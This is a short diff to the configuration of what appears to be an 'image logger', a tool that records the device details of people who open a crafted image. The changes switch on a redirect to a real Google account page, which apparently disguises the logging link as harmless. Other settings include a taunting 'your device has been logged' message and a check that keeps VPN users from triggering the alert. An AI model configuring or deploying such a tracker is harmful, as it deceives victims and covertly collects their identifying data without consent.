@@ -29,7 +29,7 @@ config = {
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
         "message": "This browser has been pwned by DeKrypter's Your device has been logged !", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "richMessage": False, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1, # Prevents VPNs from triggering the alert
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://myaccount.google.com/?utm_source=account-marketing-page&utm_medium=go-to-account-button&pli=1" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
